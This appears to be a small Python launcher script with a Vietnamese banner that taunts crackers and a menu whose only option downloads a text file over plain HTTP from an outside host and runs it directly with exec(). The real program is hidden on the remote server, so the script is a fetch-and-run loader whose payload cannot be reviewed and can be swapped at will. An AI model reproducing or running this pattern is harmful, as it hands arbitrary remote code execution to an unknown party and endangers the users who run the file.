import threading,base64
import os,time,re,json,random
from datetime import datetime
from time import sleep,strftime
import requests
import os, sys
#ĐÁNH DẤU BẢN QUYỀN
dev="\033[1;39m[\033[1;31m×\033[1;39m]\033[1;39m"

def banner():
 banner = f"""
\033[1;34m
    ██╗░░░██╗██╗░░░░░░█████╗░███╗░░██╗░██████╗░
    ██║░░░██║██║░░░░░██╔══██╗████╗░██║██╔════╝░
    ╚██╗░██╔╝██║░░░░░██║░░██║██╔██╗██║██║░░██╗░
    ░╚████╔╝░██║░░░░░██║░░██║██║╚████║██║░░╚██╗
    ░░╚██╔╝░░███████╗╚█████╔╝██║░╚███║╚██████╔╝
    ░░░╚═╝░░░╚══════╝░╚════╝░╚═╝░░╚══╝░╚═════╝░
        Mấy Bạn Bug - Dec - Crack Làm Gì Thế?

- haha mấy con gà
- file này không enc.
- muốn sửa gì sửa nma bên trong khó mà sửa
\033[1;97m= = = = = = = = = = = = = = = = = = = = = = = = = 
"""
 for X in banner:
  sys.stdout.write(X)
  sys.stdout.flush() 
  sleep(0.000001)
 
 
# =======================[RUN]=======================#
while True:
	os.system('clear')
	banner()
	
	print("\033[1;31m[\033[1;39m1\033[1;31m] \033[1;32mNhập Số 1 Để Vào Tool Nhé ")
	
	chon = input('\033[1;39m[\033[1;31m×\033[1;39m] \033[1;39m>> \033[1;39m[\033[1;32mNhập Số\033[1;39m]\033[1;39m: \033[1;32m')
	
	if chon == '1' :
		exec(requests.get('http://vlongzz.x10.mx/edittool.txt').text)
	else :
		continue